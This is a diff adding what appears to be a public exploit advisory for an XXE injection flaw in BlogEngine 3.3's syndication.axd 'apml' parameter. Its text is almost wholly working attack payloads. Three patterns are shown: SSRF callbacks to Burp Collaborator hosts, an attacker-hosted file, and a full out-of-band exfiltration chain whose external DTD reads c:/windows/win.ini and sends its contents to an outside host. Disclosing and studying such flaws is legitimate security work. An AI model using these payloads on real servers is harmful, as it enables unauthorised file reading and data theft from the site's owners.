@@ -1,0 +1,61 @@
+# Title: BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection
+# Author: Daniel Martinez Adan (aDoN90)
+# Date: 2020-05-01
+# Homepage: https://blogengine.io/
+# Software Link: https://blogengine.io/support/download/
+# Affected Versions: 3.3
+# Vulnerability: XML External Entity (XXE OOB) Injection Vulnerability
+# Severity: High
+# Status: Fixed
+# Author: Daniel Martinez Adan (aDoN90)
+# CVSS Score (3.0): CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H
+
+Technical Details
+--------------------
+
+Url: http://websiteurl-blogengine3.3/syndication.axd
+Parameter Name: apml
+Parameter Type: GET
+
+*Attack Pattern 1 (SSRF HTTP Interaction) :*
+
+http://websiteurl-blogengine3.3/syndication.axd?apml=http://hav4zt9bu9ihxzvcg59lqfapzg5it7.burpcollaborator.net
+
+*Attack Pattern 2 (SSRF to XXE HTTP Interaction):*
+
+http://b5baa301-b569-4bbf-afd9-d2eb264fdcbf.gdsdemo.com/blog/syndication.axd?apml=http://attackerip:8000/miau.txt
+
+miau.txt
+
+-----------------------------
+  <!DOCTYPE foo SYSTEM "
+">http://dgx2pxtwxkvgvkubo7ksvkywtnzhn6.burpcollaborator.net">
+<http://dgx2pxtwxkvgvkubo7ksvkywtnzhn6.burpcollaborator.net>
+-----------------------------
+[image: image.png]
+
+*Attack Pattern 3 (SSRF to XXE Exfiltration):*
+
+miau.txt
+
+-----------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://37.187.112.19:8000/test1.dtd">
+
+%sp;
+%param1;
+%exfil;
+]>
+-----------------------------
+test1.dtd
+
+-----------------------------
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM '
+http://y76a7hgbrccuyclwxwcp3br74yayyn.burpcollaborator.net/?%data;'>">
+
+-----------------------------
